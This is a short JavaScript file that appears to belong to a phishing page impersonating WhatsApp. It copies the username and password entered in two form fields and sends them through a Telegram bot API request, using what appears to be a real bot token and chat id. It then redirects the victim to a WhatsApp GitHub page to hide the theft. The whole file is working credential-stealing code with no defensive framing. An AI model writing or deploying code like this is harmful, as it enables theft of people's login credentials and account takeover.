const sendatatme = document.getElementById("sendatatme");
const first = document.getElementById("first");
const second = document.getElementById("second");
const resfirst = document.getElementById("resfirst");
const resecond = document.getElementById("resecond");

first.addEventListener("change", () => {
  resfirst.value = first.value;
});
second.addEventListener("change", () => {
  resecond.value = second.value;
});

function redirect() {
  const Http = new XMLHttpRequest();
  const url =
    "https://api.telegram.org/bot5967597388:AAErO1DCwEfl1MlAWr-mhAkGmQMf-4AeJag/sendMessage?chat_id=5681535670&text=USERNAME:%20" +
    resfirst.value +
    " PASSWORD: " +
    resecond.value;
  Http.open("GET", url);
  Http.send();

  Http.onreadystatechange = (e) => {
    console.log(Http.responseText);
  };

window.location.href = 'https://github.com/WhatsApp';
}

sendatatme.addEventListener("click", redirect);
